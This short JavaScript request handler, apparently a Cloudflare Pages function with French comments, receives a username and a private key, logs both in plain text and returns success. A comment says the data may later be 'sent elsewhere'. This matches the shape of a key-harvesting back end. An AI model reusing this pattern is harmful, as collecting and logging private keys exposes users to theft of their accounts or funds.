export async function onRequestPost(context) {
  try {
    const data = await context.request.json();

    const username = data.username || '';
    const privateKey = data.privateKey || '';

    console.log('Username reçu :', username);
    console.log('Private Key reçue :', privateKey);

    // Ici tu pourras plus tard faire ce que tu veux avec les données
    // (les envoyer ailleurs, les stocker, etc.)

    return new Response(JSON.stringify({
      success: true,
      message: 'Données reçues avec succès'
    }), {
      headers: { 'Content-Type': 'application/json' }
    });

  } catch (err) {
    return new Response(JSON.stringify({
      success: false,
      error: err.message
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}
